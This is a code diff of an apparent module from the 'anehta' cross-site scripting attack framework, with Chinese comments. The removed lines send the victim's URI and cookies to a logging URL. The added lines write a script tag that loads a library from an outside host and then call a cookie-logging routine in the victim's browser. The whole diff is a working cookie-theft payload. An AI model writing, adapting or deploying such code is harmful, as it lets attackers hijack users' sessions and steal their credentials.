@@ -6,9 +6,19 @@
 
 ////////////////////////////////////////////////////////////
 // 开始执行功能
+// Author: axis
 ////////////////////////////////////////////////////////////
-var param = XssGotURI+XssGotCookie;  // 传递回server的参数
-//param = base64encode(param); // base64 加密参数传输
-//alert(param);
-// 发送cookie 和 uri 回 server
-getURL(logurl+param);
+// 有时后需要在远程单独加载此模块,所以需要单独定义好
+/*检测是否加载了js文件*/
+var anehtaurl = "http://www.secwiki.com/anehta";
+var BaseLib = anehtaurl+"/library/base.js";
+
+
+if (typeof isBaseLibLoaded == "undefined" ){
+	//alert("base not load");
+	document.write("<script src="+BaseLib+"></script>");
+} 
+
+setTimeout(function(){ anehta.logger.logCookie(); } ,50);
+
+
